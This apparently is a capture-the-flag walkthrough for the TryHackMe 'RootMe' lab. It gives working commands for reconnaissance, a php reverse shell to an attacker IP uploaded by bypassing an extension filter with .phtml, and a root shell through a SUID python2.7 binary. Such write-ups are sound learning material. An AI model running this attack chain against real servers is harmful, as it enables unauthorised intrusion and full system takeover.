<div align="center">

# RootMe

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)[![Category](https://img.shields.io/badge/Web-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)

</div> <br/>

## `./recon`

Port scan performed via nmap:

```bash
nmap -sS <ip> -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Ports 22 (ssh) and 80 (http) found open, service versions identified

<br/>

## `./enum`

Ran gobuster to look for directories and files

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x http,php,txt

/panel                (Status: 301) [Size: 316] [--> http://<ip>/panel/]
/index.php            (Status: 200) [Size: 616]
/uploads              (Status: 301) [Size: 318] [--> http://<ip>/uploads/]
```

Found hidden directories `/panel` and `/uploads` 

Checked them via curl:
- Main page — nothing interesting
- `/uploads` — already-saved files
- `/panel` — a file upload form

Arbitrary file upload — a <font color="#ff0000">potential vulnerability</font>

<br/>

## `./exploit`

Opened a listener on port 1234

```bash
nc -lvp 1234
```

Prepared a reverse shell from a ready-made php shell

```bash
cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php shell.php
```

Edited the IP and port inside the file

```php
$ip = '<attacker_ip>';  // CHANGE THIS
$port = 1234;           // CHANGE THIS
```

Attempted to upload it to the site

```bash
curl -F 'fileUpload=@shell.php' -F 'submit=Upload' http://<ip>/panel/

PHP não é permitido!
```

The `.php` extension is filtered. Used a workaround — `.phtml`

```bash
cat shell.php > shell.phtml
curl -F 'fileUpload=@shell.phtml' -F 'submit=Upload' http://<ip>/panel/

O arquivo foi upado com sucesso!
```

File uploaded successfully. Listener running, triggered the shell via curl

```bash
curl http://<ip>/uploads/shell.phtml
```

Connection received on the listener side

```
Connection received on ip-<ip> 51546
Linux ip-<ip> 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Got access to the system as `www-data`

<br/>

## `./environment`

Shell is limited. Checked for python to upgrade the shell

```bash
python3 --version

Python 3.8.10
```

Upgraded to a full bash shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Found and read the first flag

```bash
find / -name user.txt 2>/dev/null

/var/www/user.txt
```

user.txt flag captured!

<br/>

## `./privesc`

Searched for SUID files owned by root

```bash
find / -user root -perm -4000 2>/dev/null

/usr/bin/python2.7
```

Found a vulnerable binary — `python2.7` with the SUID bit set. Used it to get a root shell

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Found and read the second flag

```bash
find / -name root.txt 2>/dev/null

/root/root.txt
```

root.txt flag captured!